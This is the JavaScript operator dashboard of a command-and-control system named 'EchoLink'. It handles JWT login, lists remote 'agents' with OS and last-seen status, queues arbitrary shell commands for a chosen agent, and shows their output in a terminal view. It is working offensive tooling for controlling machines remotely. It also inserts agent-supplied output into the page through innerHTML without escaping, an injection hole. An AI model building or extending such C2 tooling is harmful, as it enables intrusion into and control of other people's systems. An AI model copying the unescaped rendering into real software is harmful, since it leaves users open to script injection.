// Retrieve token from local storage if it exists
let jwtToken = localStorage.getItem('echolink_token');

// Helper function to inject the JWT token into every fetch request
async function fetchAuth(url, options = {}) {
    if (!options.headers) options.headers = {};
    if (jwtToken) {
        options.headers['Authorization'] = 'Bearer ' + jwtToken;
    }
    
    const response = await fetch(url, options);
    
    // If the server rejects our token (or lack thereof), show the login screen
    if (response.status === 401) {
        document.getElementById('login-screen').style.display = 'flex';
        localStorage.removeItem('echolink_token');
        jwtToken = null;
    } else {
        // Hide login screen if request was authorized
        document.getElementById('login-screen').style.display = 'none';
    }
    return response;
}

// Global variable to track the currently selected agent
let selectedAgent = null;

// Variable to cache the last fetched tasks to prevent unnecessary DOM updates
let lastTasksString = "";

// Fetch all agents from the API and render the sidebar
async function fetchAgents() {
    try {
        const res = await fetchAuth('/api/agents');
        const agents = await res.json();
        const list = document.getElementById('agent-list');
        list.innerHTML = '';
        
        agents.forEach(a => {
            const div = document.createElement('div');
            div.className = 'agent-card' + (selectedAgent === a.id ? ' active' : '');
            
            // Determine the color based on the status we got from the Python server
            const statusColor = a.status === 'Online' ? '#00ff00' : '#ff4444';
            
            div.innerHTML = `
                <div class="agent-id">
                    <span style="color: ${statusColor};">●</span> ${a.id}
                </div>
                <div class="agent-info">OS: ${a.os}</div>
                <div class="agent-info">Status: <span style="color: ${statusColor};">${a.status}</span></div>
                <div class="agent-info">Last Seen: ${a.last_seen}</div>
            `;
            div.onclick = () => selectAgent(a.id);
            list.appendChild(div);
        });
    } catch (err) { 
        console.error("Failed to fetch agents:", err); 
    }
}

// Fetch task history for the selected agent and render the terminal
async function fetchTasks() {
    if (!selectedAgent) return;
    try {
        const res = await fetchAuth(`/api/tasks/${selectedAgent}`);
        const tasksText = await res.text(); // Get raw text first
        
        // If the database response hasn't changed, do nothing! (Prevents jumpy scrolling)
        if (tasksText === lastTasksString) return;
        lastTasksString = tasksText; // Save the new state for next time
        
        const tasks = JSON.parse(tasksText);
        const term = document.getElementById('terminal');
        
        // Check if the user is currently scrolled to the very bottom
        // (Adding a 50px buffer to make it feel natural)
        const isScrolledToBottom = term.scrollHeight - term.clientHeight <= term.scrollTop + 50;
        
        let newHtml = '';
        tasks.forEach(t => {
            let statusClass = t.status === 'completed' ? 'status-completed' : '';
            newHtml += `<div class="cmd-line">EchoLink@${selectedAgent} > ${t.command} <span class="status-badge ${statusClass}">[${t.status}]</span></div>`;
            if (t.output) {
                newHtml += `<div class="cmd-output">${t.output}</div>`;
            }
        });
        
        term.innerHTML = newHtml;
        
        // Auto-scroll to bottom ONLY if the user was already at the bottom
        if (isScrolledToBottom) {
            term.scrollTop = term.scrollHeight;
        }
        
    } catch (err) { 
        console.error("Failed to fetch tasks:", err); 
    }
}

// Handle agent selection and enable the command input area
function selectAgent(id) {
    selectedAgent = id;
    lastTasksString = ""; // Reset cache when switching agents
    document.getElementById('current-agent').innerText = 'Connected: ' + id;
    document.getElementById('cmd-input').disabled = false;
    document.getElementById('send-btn').disabled = false;
    document.getElementById('cmd-input').focus();
    fetchAgents();
    fetchTasks();
}

// Send a new command to the C2 server API
async function sendCommand() {
    const input = document.getElementById('cmd-input');
    const cmd = input.value.trim();
    if (!cmd || !selectedAgent) return;
    
    input.value = ''; // Clear input field
    
    try {
        await fetchAuth('/add_task', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({agent_id: selectedAgent, command: cmd})
        });
        fetchTasks(); // Instantly refresh terminal to show the pending task
    } catch (err) { 
        console.error("Failed to send command:", err); 
    }
}

// Event Listeners for the execute button and Enter key
document.getElementById('send-btn').onclick = sendCommand;
document.getElementById('cmd-input').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') sendCommand();
});

// Polling loop: Refresh agents and tasks every 2 seconds to ensure real-time updates
setInterval(() => {
    fetchAgents();
    fetchTasks();
}, 2000);

// Handle the Login process
document.getElementById('login-btn').onclick = async () => {
    const user = document.getElementById('login-user').value;
    const pass = document.getElementById('login-pass').value;
    const errorDiv = document.getElementById('login-error');
    
    try {
        const res = await fetch('/api/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username: user, password: pass})
        });
        
        const data = await res.json();
        
        if (res.status === 200 && data.token) {
            // Save the token and refresh the dashboard
            jwtToken = data.token;
            localStorage.setItem('echolink_token', jwtToken);
            errorDiv.innerText = '';
            document.getElementById('login-screen').style.display = 'none';
            fetchAgents();
            fetchTasks();
        } else {
            errorDiv.innerText = data.message || 'Login failed';
        }
    } catch (err) {
        errorDiv.innerText = 'Server connection error';
    }
};

// Initial fetch on page load
fetchAgents();